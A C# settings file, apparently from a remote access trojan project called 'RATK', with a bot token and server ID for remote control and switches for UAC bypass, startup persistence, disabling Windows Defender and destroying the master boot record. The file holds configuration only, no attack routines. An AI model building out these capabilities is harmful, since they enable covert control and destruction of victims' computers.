using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace RATK
{
    internal class Settings
    {
        public static string BotToken = "";
        public static ulong ServerId = 0;

        public static bool AutoCriticalProcess = false;
        public static bool AutoTryBypassUAC = false;
        public static bool AutoOnStartup = false;
        public static bool AutoDestroyMBR = false;
        public static bool AutoDisableDefender = false;

        public static string RegistryName = "RATK";
    }
    internal class RuntimeSettings
    {
        public static bool IsCriticalProcess = false;
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
    }
}
